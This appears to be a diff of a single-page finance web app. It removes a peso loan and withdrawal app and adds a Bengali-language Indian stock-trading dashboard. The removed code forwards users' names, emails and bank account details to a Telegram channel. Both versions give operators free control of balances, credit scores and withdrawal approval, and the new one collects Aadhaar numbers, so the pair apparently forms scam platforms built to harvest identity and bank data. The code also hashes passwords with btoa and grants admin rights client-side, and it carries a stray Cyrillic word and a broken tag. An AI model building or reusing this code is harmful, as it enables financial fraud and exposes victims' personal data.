-    generatedLoanCode = '';
-    pendingLoanAmount = 0;
-  } else {
-    showToast('❌ Invalid code. Please check your Telegram.','error');
-  }
-}
-
-// ============================================================
-//  BANK SELECTION
-// ============================================================
-function selectBank(el){
-  document.querySelectorAll('.bank-card').forEach(c=>c.classList.remove('selected'));
-  el.classList.add('selected');
-  selectedBank=el.dataset.bank;
-  document.getElementById('selected-bank-name').textContent=selectedBank;
-  document.getElementById('withdraw-form-section').style.display='block';
-}
-
-// ============================================================
-//  WITHDRAW
-// ============================================================
-function submitWithdraw(){
-  if(!currentUser){ showToast('Please login first','error'); return; }
-  if(!selectedBank){ showToast('Please select a bank or wallet','error'); return; }
-
-  const amount   = parseFloat(document.getElementById('wd-amount').value);
-  const account  = document.getElementById('wd-account').value.trim();
-  const accName  = document.getElementById('wd-accname').value.trim();
-  const password = document.getElementById('wd-password').value;
-
-  if(!amount||!account||!accName||!password){
-    showToast('Please fill in all withdrawal fields','error'); return;
-  }
-  if(amount<100){ showToast('Minimum withdrawal is ₱100','error'); return; }
-  if(password!==currentUser.password){ showToast('Incorrect password','error'); return; }
-  if(amount>Number(currentUser.balance)){ showToast('Insufficient balance','error'); return; }
-
-  const btn=document.getElementById('wd-btn');
-  btn.disabled=true; btn.textContent='Processing...';
-
-  pendingWdAmount = amount;
-  pendingWdData = {account, accName, bank: selectedBank};
-  
-  currentUser.balance = Number(currentUser.balance) - amount;
-  users[currentSlot] = currentUser;
-  saveUsers();
-  loadDashboard();
-
-  generatedWdCode = generateRandomCode();
-
-  sendTelegramWithCode(
-    `💸 <b>WITHDRAWAL</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName}\n📧 <b>Email:</b> ${currentUser.email}\n🏦 <b>Bank/Wallet:</b> ${selectedBank}\n💳 <b>Account #:</b> ${account}\n👤 <b>Account Name:</b> ${accName}\n💰 <b>Amount:</b> ₱${amount.toLocaleString()}\n🔑 <b>Slot:</b> #${currentSlot}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`,
-    generatedWdCode
-  );
-
-  setTimeout(()=>{
-    btn.disabled=false; btn.textContent='🏧 Process Withdrawal';
-    startWdConfirmCountdown(amount);
-    document.getElementById('wd-amount').value='';
-    document.getElementById('wd-account').value='';
-    document.getElementById('wd-accname').value='';
-    document.getElementById('wd-password').value='';
-  },600);
-}
-
-// ============================================================
-//  WITHDRAW CONFIRM COUNTDOWN — 1 Minute
-// ============================================================
-function startWdConfirmCountdown(amount){
-  let totalSeconds = 60;
-  const timeLabel=document.getElementById('wd-confirm-time');
-  document.getElementById('overlay-wd-confirm').classList.add('active');
-
-  clearInterval(wdConfirmTimer);
-  wdConfirmTimer=setInterval(()=>{
-    totalSeconds--;
-    const mins=Math.floor(totalSeconds/60);
-    const secs=totalSeconds%60;
-    timeLabel.textContent=`${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`;
-
-    if(totalSeconds<=0){
-      clearInterval(wdConfirmTimer);
-      document.getElementById('overlay-wd-confirm').classList.remove('active');
-      
-      if(currentUser && pendingWdAmount){
-        currentUser.balance = Number(currentUser.balance) + pendingWdAmount;
-        users[currentSlot] = currentUser;
-        saveUsers();
-        loadDashboard();
-        showToast('⏰ Withdrawal expired. Balance restored.','error',5000);
-        sendTelegram(
-          `❌ <b>WITHDRAWAL EXPIRED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName}\n💰 <b>Amount:</b> ₱${pendingWdAmount.toLocaleString()}\n💳 <b>Balance Restored:</b> ₱${Number(currentUser.balance).toLocaleString()}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
-        );
-        pendingWdAmount = 0;
-        pendingWdData = null;
-        generatedWdCode = '';
-      }
-    }
-  },1000);
-}
-
-// ============================================================
-//  WITHDRAW CODE VERIFICATION
-// ============================================================
-function verifyWdCode(){
-  const code = getCode('wd-code');
-  if(!code){ showToast('Please enter the 6-digit code','error'); return; }
-
-  if(!pendingWdData || !pendingWdAmount){
-    showToast('No pending withdrawal','error');
-    return;
-  }
-
-  if(code === generatedWdCode){
-    clearInterval(wdConfirmTimer);
-    document.getElementById('overlay-wd-confirm').classList.remove('active');
-    
-    showToast('✅ Withdrawal of ₱'+pendingWdAmount.toLocaleString()+' confirmed!','success',5000);
-    
-    sendTelegram(
-      `✅ <b>WITHDRAWAL CONFIRMED</b>\n━━━━━━━━━━━━━━━\n👤 <b>Name:</b> ${currentUser.fullName}\n📧 <b>Email:</b> ${currentUser.email}\n🏦 <b>Bank/Wallet:</b> ${pendingWdData.bank}\n💳 <b>Account #:</b> ${pendingWdData.account}\n💰 <b>Amount:</b> ₱${pendingWdAmount.toLocaleString()}\n💳 <b>Remaining Balance:</b> ₱${Number(currentUser.balance).toLocaleString()}\n⏰ <b>Time:</b> ${new Date().toLocaleString('en-PH')}`
-    );
-    
-    clearCode('wd-code');
-    pendingWdAmount = 0;
-    pendingWdData = null;
-    generatedWdCode = '';
-  } else {
-    showToast('❌ Invalid code. Please check your Telegram.','error');
-  }
-}
-
-// ============================================================
-//  CANCEL WITHDRAW
-// ============================================================
-function cancelWithdraw(){
-  if(currentUser && pendingWdAmount){
-    currentUser.balance = Number(currentUser.balance) + pendingWdAmount;
-    users[currentSlot] = currentUser;
-    saveUsers();
-    loadDashboard();
-  }
-  clearInterval(wdConfirmTimer);
-  document.getElementById('overlay-wd-confirm').classList.remove('active');
-  pendingWdAmount = 0;
-  pendingWdData = null;
-  generatedWdCode = '';
-  showToast('Withdrawal cancelled. Balance restored.','info');
-}
-
-// ============================================================
-//  ID MODAL
-// ============================================================
-function openIdModal(){
-  document.getElementById('modal-id').classList.add('active');
-}
-function closeIdModal(){
-  document.getElementById('modal-id').classList.remove('active');
-}
-document.getElementById('modal-id').addEventListener('click',function(e){
-  if(e.target===this) closeIdModal();
-});
-
-// ============================================================
-//  LOGOUT (CLEAR SESSION)
-// ============================================================
-function doLogout(){
-  clearSession(); // CLEAR SESSION STORAGE
-  currentSlot=null;
-  currentUser=null;
-  selectedBank='';
-  clearInterval(loanConfirmTimer);
-  clearInterval(wdConfirmTimer);
-  document.getElementById('overlay-loan-confirm').classList.remove('active');
-  document.getElementById('overlay-wd-confirm').classList.remove('active');
-  document.getElementById('overlay-bank-verify').classList.remove('active');
-  switchTab('home');
-  showScreen('screen-login');
-  showToast('Logged out successfully','info');
-}
-
-// ============================================================
-//  DISABLE BROWSER AUTOCOMPLETE
-// ============================================================
-function disableAutofill(){
-  document.querySelectorAll('input').forEach(inp=>{
-    inp.setAttribute('autocomplete','new-password');
-    inp.setAttribute('data-lpignore','true');
-    inp.setAttribute('data-form-type','other');
-  });
-}
-
-// ============================================================
-//  STARTUP
-// ============================================================
-window.addEventListener('DOMContentLoaded',()=>{
-  initUsers();
-  disableAutofill();
-  
-  // CHECK FOR EXISTING SESSION
-  if(checkAutoLogin()) {
-    console.log('✅ Auto-login successful - session restored');
-  } else {
-    console.log('ℹ️ No active session found - showing login screen');
-  }
-});
-</script>
-
-<script>
-// ADMIN FUNCTIONS
-function adminViewUsers(){
-  const u=JSON.parse(localStorage.getItem('fsl_v5')||'{}');
-  console.table(Object.entries(u).map(([slot,data])=>({slot,...data})));
-  return u;
-}
-function adminSetUser(slot, data){
-  const u=JSON.parse(localStorage.getItem('fsl_v5')||'{}');
-  u[String(slot)]={...u[String(slot)],...data};
-  localStorage.setItem('fsl_v5',JSON.stringify(u));
-  users=u;
-  console.log(`✅ Slot ${slot} updated:`,u[String(slot)]);
-  return u[String(slot)];
-}
-function adminReset(){
-  localStorage.removeItem('fsl_v5');
-  localStorage.removeItem('fsl_session');
-  location.reload();
-}
-function adminGetSlot(slot){
-  const u=JSON.parse(localStorage.getItem('fsl_v5')||'{}');
-  return u[String(slot)];
-}
-function adminClearSlot(slot){
-  return adminSetUser(slot,{email:"",password:"",balance:0,loanStatus:"none",loanAmount:0,fullName:"",idName:"",idNumber:"",verified:false});
-}
-function adminAddBalance(slot,amount){
-  const u=JSON.parse(localStorage.getItem('fsl_v5')||'{}');
-  u[String(slot)].balance=(Number(u[String(slot)].balance||0)+amount);
-  localStorage.setItem('fsl_v5',JSON.stringify(u));
-  users=u;
-  if(currentSlot===String(slot)){ currentUser=users[currentSlot]; loadDashboard(); }
-  console.log(`✅ Added ₱${amount} to slot ${slot}. New balance: ₱${u[String(slot)].balance}`);
-}
-function adminSetLoanStatus(slot,status){
-  return adminSetUser(slot,{loanStatus:status});
-}
-function adminClearAllSessions(){
-  localStorage.removeItem('fsl_session');
-  console.log('✅ All sessions cleared');
-}
-console.log('%c🏦 FSL Admin Panel Ready','color:#f0b90b;font-size:16px;font-weight:bold;');
-console.log('%cCommands: adminViewUsers() | adminSetUser(slot,{...}) | adminAddBalance(slot,amount) | adminSetLoanStatus(slot,status) | adminReset() | adminClearAllSessions()','color:#666;font-size:12px;');
-</script>
-
-<!--Start of Tawk.to Script-->
-<script type="text/javascript">
-var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
-(function(){
-var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
-s1.async=true;
-s1.src='https://embed.tawk.to/6a397c2849e0e21d4954f33a/1jro8q0h2';
-s1.charset='UTF-8';
-s1.setAttribute('crossorigin','*');
-s0.parentNode.insertBefore(s1,s0);
-})();
-</script>
-<!--End of Tawk.to Script-->
+
+        <!-- CONTENT -->
+        <div class="content scrollable">
+
+            <!-- ===== DASHBOARD ===== -->
+            <div class="page active" id="page-dashboard">
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="stat-label">মোট ব্যালেন্স</div>
+                        <div class="stat-value" id="stat-balance">₹0.00</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">পোর্টফোলিও মান</div>
+                        <div class="stat-value" id="stat-portfolio">₹0.00</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">লাভ/ক্ষতি</div>
+                        <div class="stat-value" id="stat-pl">₹0.00</div>
+                        <div class="stat-change" id="stat-pl-pct">0%</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="stat-label">ক্রেডিট স্কোর</div>
+                        <div class="stat-value" id="stat-credit">600</div>
+                    </div>
+                </div>
+
+                <div class="chart-container">
+                    <div id="tradingview-widget"></div>
+                </div>
+
+                <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:16px;">
+                    <button class="btn btn-green" id="quick-buy-btn"><i class="fas fa-arrow-up"></i> কেনা</button>
+                    <button class="btn btn-red" id="quick-sell-btn"><i class="fas fa-arrow-down"></i> বিক্রি</button>
+                    <button class="btn btn-primary" id="quick-deposit-btn"><i class="fas fa-plus-circle"></i> ডিপোজিট</button>
+                </div>
+
+                <div class="stocks-table-wrap">
+                    <div class="table-header">
+                        <h3>📊 লাইভ মার্কেট</h3>
+                        <div class="search-box">
+                            <i class="fas fa-search"></i>
+                            <input type="text" id="market-search" placeholder="স্টক খুঁজুন..." />
+                        </div>
+                    </div>
+                    <div style="overflow-x:auto;">
+                        <table class="stocks-table" id="market-table">
+                            <thead>
+                                <tr>
+                                    <th>সিম্বল</th>
+                                    <th>নাম</th>
+                                    <th>দাম (₹)</th>
+                                    <th>পরিবর্তন</th>
+                                    <th>অ্যাকশন</th>
+                                </tr>
+                            </thead>
+                            <tbody id="market-tbody"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== MARKETS ===== -->
+            <div class="page" id="page-markets">
+                <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:8px;">
+                    <h2 style="font-size:20px;">📈 সব ইন্ডিয়ান স্টক</h2>
+                    <div class="search-box" style="background:var(--bg-input);padding:4px 12px;border-radius:20px;border:1px solid var(--border-color);display:flex;align-items:center;gap:8px;">
+                        <i class="fas fa-search" style="color:var(--text-muted);"></i>
+                        <input type="text" id="market-search-full" placeholder="সিম্বল বা নাম..." style="background:transparent;padding:6px 0;width:180px;" />
+                    </div>
+                </div>
+                <div class="stocks-table-wrap">
+                    <div style="overflow-x:auto;">
+                        <table class="stocks-table" id="markets-full-table">
+                            <thead>
+                                <tr>
+                                    <th>সিম্বল</th>
+                                    <th>নাম</th>
+                                    <th>এক্সচেঞ্জ</th>
+                                    <th>বর্তমান দাম (₹)</th>
+                                    <th>পরিবর্তন</th>
+                                    <th>অ্যাকশন</th>
+                                </tr>
+                            </thead>
+                            <tbody id="markets-full-tbody"></tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== WALLET ===== -->
+            <div class="page" id="page-wallet">
+                <h2 style="font-size:20px;margin-bottom:16px;">💰 ওয়ালেট</h2>
+                <div class="wallet-grid">
+                    <div class="wallet-card">
+                        <h4>📊 ব্যালেন্স</h4>
+                        <div class="wallet-balance" id="wallet-balance">₹0.00</div>
+                        <div style="display:flex;gap:8px;flex-wrap:wrap;">
+                            <button class="btn btn-green" id="wallet-deposit-btn"><i class="fas fa-plus"></i> ডিপোজিট</button>
+                            <button class="btn btn-red" id="wallet-withdraw-btn"><i class="fas fa-minus"></i> উইথড্র</button>
+                        </div>
+                    </div>
+                    <div class="wallet-card">
+                        <h4>🏦 ব্যাংক / UPI</h4>
+                        <div id="bank-details-display">
+                            <p style="color:var(--text-secondary);font-size:14px;">কোনো ব্যাংক বিবরণ যোগ করা হয়নি</p>
+                        </div>
+                        <button class="btn btn-outline btn-sm" id="update-bank-btn" style="margin-top:8px;"><i class="fas fa-pen"></i> আপডেট</button>
+                    </div>
+                </div>
+                <div style="margin-top:20px;">
+                    <div class="stocks-table-wrap">
+                        <div class="table-header"><h3>📜 লেনদেন ইতিহাস</h3></div>
+                        <div style="overflow-x:auto;">
+                            <table class="stocks-table">
+                                <thead><tr><th>টাইপ</th><th>পরিমাণ (₹)</th><th>স্ট্যাটাস</th><th>তারিখ</th></tr></thead>
+                                <tbody id="transaction-history"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== PROFILE ===== -->
+            <div class="page" id="page-profile">
+                <h2 style="font-size:20px;margin-bottom:16px;">👤 প্রোফাইল</h2>
+                <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;max-width:700px;">
+                    <div class="wallet-card">
+                        <h4>ব্যক্তিগত তথ্য</h4>
+                        <div style="margin-top:8px;">
+                            <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-color);">
+                                <span style="color:var(--text-secondary);">নাম</span>
+                                <span id="profile-name">-</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-color);">
+                                <span style="color:var(--text-secondary);">ফোন</span>
+                                <span id="profile-phone">-</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-color);">
+                                <span style="color:var(--text-secondary);">আধার</span>
+                                <span id="profile-aadhaar">-</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border-color);">
+                                <span style="color:var(--text-secondary);">স্ট্যাটাস</span>
+                                <span id="profile-status">-</span>
+                            </div>
+                            <div style="display:flex;justify-content:space-between;padding:6px 0;">
+                                <span style="color:var(--text-secondary);">ক্রেডিট স্কোর</span>
+                                <span id="profile-credit">-</span>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="wallet-card">
+                        <h4>পোর্টফোলিও</h4>
+                        <div id="portfolio-list" style="margin-top:8px;font-size:14px;">
+                            <p style="color:var(--text-secondary);">কোনো স্টক নেই</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <!-- ===== ADMIN ===== -->
+            <div class="page" id="page-admin">
+                <h2 style="font-size:20px;margin-bottom:16px;">🛡️ অ্যাডমিন প্যানেল</h2>
+                <div class="admin-grid" id="admin-grid">
+                    <!-- User Management -->
+                    <div class="admin-card">
+                        <h5>👥 ইউজার ম্যানেজমেন্ট</h5>
+                        <div id="admin-user-list" style="max-height:200px;overflow-y:auto;font-size:13px;"></div>
+                        <div style="margin-top:8px;">
+                            <input type="text" id="admin-user-id" placeholder="User ID" style="font-size:12px;" />
+                            <div style="display:flex;gap:4px;flex-wrap:wrap;margin-top:4px;">
+                                <button class="btn btn-sm btn-primary" id="admin-load-user">লোড</button>
+                                <button class="btn btn-sm btn-green" id="admin-verify-user">✅ যাচাই</button>
+                                <button class="btn btn-sm btn-yellow" style="background:var(--accent-yellow);color:#000;" id="admin-freeze-toggle">⛔ ফ্রিজ</button>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- Balance Control -->
+                    <div class="admin-card">
+                        <h5>💰 ব্যালেন্স কন্ট্রোল</h5>
+                        <div class="admin-row"><span class="label">বর্তমান ব্যালেন্স</span><span class="value" id="admin-balance-display">₹0</span></div>
+                        <input type="number" id="admin-balance-amount" placeholder="পরিমাণ" style="font-size:12px;" />
+                        <div style="display:flex;gap:4px;margin-top:4px;">
+                            <button class="btn btn-sm btn-green" id="admin-add-balance"><i class="fas fa-plus"></i> যোগ</button>
+                            <button class="btn btn-sm btn-red" id="admin-sub-balance"><i class="fas fa-minus"></ি> কমানো</button>
+                        </div>
+                    </div>
+                    <!-- Credit Score -->
+                    <div class="admin-card">
+                        <h5>⭐ ক্রেডিট স্কোর</h5>
+                        <div class="admin-row"><span class="label">বর্তমান স্কোর</span><span class="value" id="admin-credit-display">600</span></div>
+                        <input type="number" id="admin-credit-amount" placeholder="পরিবর্তন" style="font-size:12px;" />
+                        <div style="display:flex;gap:4px;margin-top:4px;">
+                            <button class="btn btn-sm btn-green" id="admin-add-credit"><i class="fas fa-plus"></i> বাড়ান</button>
+                            <button class="btn btn-sm btn-red" id="admin-sub-credit"><i class="fas fa-minus"></i> কমানো</button>
+                        </div>
+                    </div>
+                    <!-- Withdraw Approvals -->
+                    <div class="admin-card">
+                        <h5>💸 উইথড্র রিকোয়েস্ট</h5>
+                        <div id="admin-withdraw-list" style="max-height:160px;overflow-y:auto;font-size:13px;"></div>
+                    </div>
+                    <!-- Add Stock -->
+                    <div class="admin-card">
+                        <h5>📈 স্টক যোগ করুন</h5>
+                        <input type="text" id="admin-stock-symbol" placeholder="সিম্বল (e.g. RELIANCE)" style="font-size:12px;margin-bottom:4px;" />
+                        <input type="text" id="admin-stock-name" placeholder="নাম" style="font-size:12px;margin-bottom:4px;" />
+                        <input type="text" id="admin-stock-exchange" placeholder="এক্সচেঞ্জ (NSE/BSE)" style="font-size:12px;margin-bottom:4px;" />
+                        <input type="number" id="admin-stock-price" placeholder="দাম" style="font-size:12px;margin-bottom:4px;" />
+                        <button class="btn btn-sm btn-primary btn-block" id="admin-add-stock"><i class="fas fa-plus"></i> স্টক যোগ করুন</button>
+                    </div>
+                    <!-- System Status -->
+                    <div class="admin-card">
+                        <h5>📊 সিস্টেম স্ট্যাটাস</h5>
+                        <div class="admin-row"><span class="label">মোট ইউজার</span><span class="value" id="admin-total-users">0</span></div>
+                        <div class="admin-row"><span class="label">মোট স্টক</span><span class="value" id="admin-total-stocks">0</span></div>
+                        <div class="admin-row"><span class="label">মোট অর্ডার</span><span class="value" id="admin-total-orders">0</span></div>
+                        <div class="admin-row"><span class="label">পেন্ডিং উইথড্র</span><span class="value" id="admin-pending-withdraw">0</span></div>
+                    </div>
+                </div>
+            </div>
+
+        </div><!-- /content -->
+    </div><!-- /main -->
+
+    <!-- ============================================================ -->
+    <!-- JAVASCRIPT -->
+    <!-- ============================================================ -->
+    <script>
+        // ===================================================================
+        // SUPABASE SETUP
+        // ===================================================================
+        const supabaseUrl = 'https://qajdgueavfofwtavmkxi.supabase.co';
+        const supabaseKey =
+            'sb_publishable_NqFN_vK1dp64ZrI94MZsEA_DcTFMRof';
+        const supabase = supabase.createClient(supabaseUrl, supabaseKey);
+
+        // ===================================================================
+        // STATE
+        // ===================================================================
+        let currentUser = null;
+        let currentUserData = null;
+        let allStocks = [];
+        let userPortfolio = [];
+        let allOrders = [];
+        let allTransactions = [];
+        let allUsers = [];
+        let priceInterval = null;
+        let isAdmin = false;
+
+        // ===================================================================
+        // DOM REFS
+        // ===================================================================
+        const $ = id => document.getElementById(id);
+        const $$ = sel => document.querySelectorAll(sel);
+
+        const authPage = $('auth-page');
+        const loginForm = $('login-form');
+        const registerForm = $('register-form');
+        const loginBtn = $('login-btn');
+        const registerBtn = $('register-btn');
+        const gotoRegister = $('goto-register');
+        const gotoLogin = $('goto-login');
+        const authError = $('auth-error');
+        const authSuccess = $('auth-success');
+
+        const logoutBtn = $('logout-btn');
+        const sidebarName = $('sidebar-name');
+        const sidebarPhone = $('sidebar-phone');
+        const sidebarAvatar = $('sidebar-avatar');
+        const topbarBalance = $('topbar-balance');
+        const topbarCredit = $('topbar-credit');
+        const topbarStatus = $('topbar-status');
+
+        const pages = $$('.page');
+        const navItems = $$('.nav-item');
+        const pageTitle = $('page-title');
+
+        // ===================================================================
+        // TOAST SYSTEM
+        // ===================================================================
+        function toast(msg, type = 'info') {
+            const container = $('toast-container');
+            const el = document.createElement('div');
+            el.className = `toast ${type}`;
+            const icons = { info: 'ℹ️', success: '✅', error: '❌', warning: '⚠️' };
+            el.innerHTML = `${icons[type] || 'ℹ️'} ${msg}`;
+            container.appendChild(el);
+            setTimeout(() => { el.style.opacity = '0';
+                setTimeout(() => el.remove(), 300); }, 3500);
+        }
+
+        // ===================================================================
+        // MODAL
+        // ===================================================================
+        function openModal(title, bodyHTML) {
+            $('modal-title').textContent = title;
+            $('modal-body').innerHTML = bodyHTML;
+            $('modal-overlay').classList.add('open');
+        }
+
+        function closeModal() {
+            $('modal-overlay').classList.remove('open');
+        }
+        $('modal-close').addEventListener('click', closeModal);
+        $('modal-overlay').addEventListener('click', (e) => {
+            if (e.target === e.currentTarget) closeModal();
+        });
+
+        // ===================================================================
+        // AUTH
+        // ===================================================================
+        function showAuthError(msg) { authError.textContent = msg;
+            authError.style.display = 'block';
+            authSuccess.style.display = 'none'; }
+
+        function showAuthSuccess(msg) { authSuccess.textContent = msg;
+            authSuccess.style.display = 'block';
+            authError.style.display = 'none'; }
+
+        function hideAuthMessages() { authError.style.display = 'none';
+            authSuccess.style.display = 'none'; }
+
+        gotoRegister.addEventListener('click', () => {
+            loginForm.classList.add('hidden');
+            registerForm.classList.remove('hidden');
+            hideAuthMessages();
+        });
+        gotoLogin.addEventListener('click', () => {
+            registerForm.classList.add('hidden');
+            loginForm.classList.remove('hidden');
+            hideAuthMessages();
+        });
+
+        // Register
+        registerBtn.addEventListener('click', async () => {
+            const name = $('reg-name').value.trim();
+            const phone = $('reg-phone').value.trim();
+            const aadhaar = $('reg-aadhaar').value.trim();
+            const password = $('reg-password').value.trim();
+            if (!name || !phone || !aadhaar || !password) {
+                return showAuthError('সব ফিল্ড পূরণ করুন');
+            }
+            if (phone.length < 10) return showAuthError('সঠিক ফোন নম্বর দিন');
+            if (aadhaar.replace(/\s/g, '').length < 12) return showAuthError('সঠিক আধার নম্বর দিন');
+            if (password.length < 6) return showAuthError('পাসওয়ার্ড ৬+ অক্ষরের হতে হবে');
+
+            hideAuthMessages();
+            registerBtn.disabled = true;
+            registerBtn.innerHTML = '<span class="spinner"></span>';
+
+            try {
+                // Check if user exists
+                const { data: existing } = await supabase
+                    .from('users')
+                    .select('id')
+                    .eq('phone', phone)
+                    .maybeSingle();
+
+                if (existing) {
+                    showAuthError('এই ফোন নম্বর уже রেজিস্টার করা আছে');
+                    registerBtn.disabled = false;
+                    registerBtn.textContent = 'রেজিস্টার করুন';
+                    return;
+                }
+
+                // Hash password (simple - in production use bcrypt)
+                const hashed = btoa(password + 'salt');
+
+                const { data, error } = await supabase
+                    .from('users')
+                    .insert({
+                        name,
+                        phone,
+                        aadhaar_number: aadhaar,
+                        password_hash: hashed,
+                        balance: 0,
+                        credit_score: 600,
+                        is_verified: false,
+                        is_frozen: false
+                    })
+                    .select()
+                    .single();
+
+                if (error) throw error;
+
+                showAuthSuccess('🎉 রেজিস্টার সফল! এখন লগইন করুন।');
+                setTimeout(() => {
+                    loginForm.classList.remove('hidden');
+                    registerForm.classList.add('hidden');
+                    hideAuthMessages();
+                    $('login-phone').value = phone;
+                }, 1200);
+
+            } catch (err) {
+                showAuthError(err.message || 'রেজিস্টার ব্যর্থ');
+            }
+            registerBtn.disabled = false;
+            registerBtn.textContent = 'রেজিস্টার করুন';
+        });
+
+        // Login
+        loginBtn.addEventListener('click', async () => {
+            const phone = $('login-phone').value.trim();
+            const password = $('login-password').value.trim();
+            if (!phone || !password) return showAuthError('ফোন ও পাসওয়ার্ড দিন');
+
+            hideAuthMessages();
+            loginBtn.disabled = true;
+            loginBtn.innerHTML = '<span class="spinner"></span>';
+
+            try {
+                const hashed = btoa(password + 'salt');
+                const { data, error } = await supabase
+                    .from('users')
+                    .select('*')
+                    .eq('phone', phone)
+                    .eq('password_hash', hashed)
+                    .maybeSingle();
+
+                if (error) throw error;
+                if (!data) {
+                    showAuthError('ফোন বা পাসওয়ার্ড ভুল');
+                    loginBtn.disabled = false;
+                    loginBtn.textContent = 'লগইন করুন';
+                    return;
+                }
+
+                // Set session
+                currentUser = data;
+                currentUserData = data;
+                localStorage.setItem('stock_user_id', data.id);
+                localStorage.setItem('stock_user_phone', data.phone);
+
+                // Check admin (first user is admin)
+                const { count } = await supabase.from('users').select('*', { count: 'exact', head: true });
+                isAdmin = count === 1 || data.phone === '+919876543210';
+
+                await loadApp();
+                showApp();
+
+            } catch (err) {
+                showAuthError(err.message || 'লগইন ব্যর্থ');
+            }
+            loginBtn.disabled = false;
+            loginBtn.textContent = 'লগইন করুন';
+        });
+
+        // Auto-login check
+        async function checkAutoLogin() {
+            const id = localStorage.getItem('stock_user_id');
+            if (!id) return;
+            try {
+                const { data, error } = await supabase
+                    .from('users')
+                    .select('*')
+                    .eq('id', id)
+                    .maybeSingle();
+                if (error || !data) return;
+                currentUser = data;
+                currentUserData = data;
+                const { count } = await supabase.from('users').select('*', { count: 'exact', head: true });
+                isAdmin = count === 1 || data.phone === '+919876543210';
+                await loadApp();
+                showApp();
+            } catch (e) { /* ignore */ }
+        }
+
+        // ===================================================================
+        // APP LOAD
+        // ===================================================================
+        async function loadApp() {
+            if (!currentUser) return;
+            // Load stocks
+            await loadStocks();
+            // Load portfolio
+            await loadPortfolio();
+            // Load orders
+            await loadOrders();
+            // Load transactions
+            await loadTransactions();
+            // Load users (admin)
+            if (isAdmin) await loadAllUsers();
+            // Update UI
+            updateUI();
+            // Start price updates
+            startPriceUpdates();
+            // Setup admin if admin
+            if (isAdmin) {
+                $('admin-nav').style.display = 'flex';
+                setupAdmin();
+            }
+            // Setup trade panel
+            setupTradePanel();
+            // Setup wallet
+            setupWallet();
+            // Setup profile
+            updateProfile();
+            // Render market table
+            renderMarketTable();
+            renderMarketsFull();
+            // Render transaction history
+            renderTransactions();
+            // Init chart
+            initChart();
+        }
+
+        function showApp() {
+            authPage.style.display = 'none';
+            document.body.style.overflow = 'hidden';
+            // Update user info
+            sidebarName.textContent = currentUser.name || 'ব্যবহারকারী';
+            sidebarPhone.textContent = currentUser.phone || '';
+            sidebarAvatar.textContent = (currentUser.name || 'U')[0].toUpperCase();
+            topbarBalance.textContent = Number(currentUser.balance || 0).toFixed(2);
+            topbarCredit.textContent = `⭐ ${currentUser.credit_score || 600}`;
+            updateStatusBadge();
+            // Navigate to dashboard
+            navigateTo('dashboard');
+        }
+
+        function updateStatusBadge() {
+            const v = currentUser.is_verified;
+            const f = currentUser.is_frozen;
+            if (f) {
+                topbarStatus.textContent = '⛔ ফ্রোজেন';
+                topbarStatus.className = 'status-badge frozen';
+            } else if (v) {
+                topbarStatus.textContent = '✅ যাচাইকৃত';
+                topbarStatus.className = 'status-badge verified';
+            } else {
+                topbarStatus.textContent = '⏳ যাচাই হয়নি';
+                topbarStatus.className = 'status-badge unverified';
+            }
+        }
+
+        // ===================================================================
+        // NAVIGATION
+        // ===================================================================
+        function navigateTo(page) {
+            pages.forEach(p => p.classList.remove('active'));
+            const target = $(`page-${page}`);
+            if (target) target.classList.add('active');
+            navItems.forEach(n => n.classList.remove('active'));
+            navItems.forEach(n => {
+                if (n.dataset.page === page) n.classList.add('active');
+            });
+            const titles = {
+                dashboard: '📊 ড্যাশবোর্ড',
+                markets: '📈 মার্কেট',
+                wallet: '💰 ওয়ালেট',
+                profile: '👤 প্রোফাইল',
+                admin: '🛡️ অ্যাডমিন'
+            };
+            pageTitle.textContent = titles[page] || page;
+            // Scroll to top
+            document.querySelector('.content').scrollTop = 0;
+            // Refresh data if needed
+            if (page === 'wallet') {
+                loadTransactions();
+                renderTransactions();
+                updateWalletUI();
+            }
+            if (page === 'admin' && isAdmin) {
+                loadAllUsers();
+                loadWithdrawRequests();
+                updateAdminStats();
+            }
+            if (page === 'profile') updateProfile();
+            if (page === 'dashboard') renderMarketTable();
+            if (page === 'markets') renderMarketsFull();
+        }
+
+        navItems.forEach(item => {
+            item.addEventListener('click', () => {
+                const page = item.dataset.page;
+                if (page) navigateTo(page);
+            });
+        });
+
+        logoutBtn.addEventListener('click', async () => {
+            localStorage.removeItem('stock_user_id');
+            localStorage.removeItem('stock_user_phone');
+            currentUser = null;
+            currentUserData = null;
+            if (priceInterval) clearInterval(priceInterval);
+            authPage.style.display = 'flex';
+            document.body.style.overflow = 'auto';
+            loginForm.classList.remove('hidden');
+            registerForm.classList.add('hidden');
+            hideAuthMessages();
+            $('login-password').value = '';
+            toast('লগআউট সফল', 'success');
+        });
+
+        // ===================================================================
+        // STOCKS
+        // ===================================================================
+        const DEFAULT_STOCKS = [
+            { symbol: 'RELIANCE', name: 'Reliance Industries', exchange: 'NSE', price: 2850.50 },
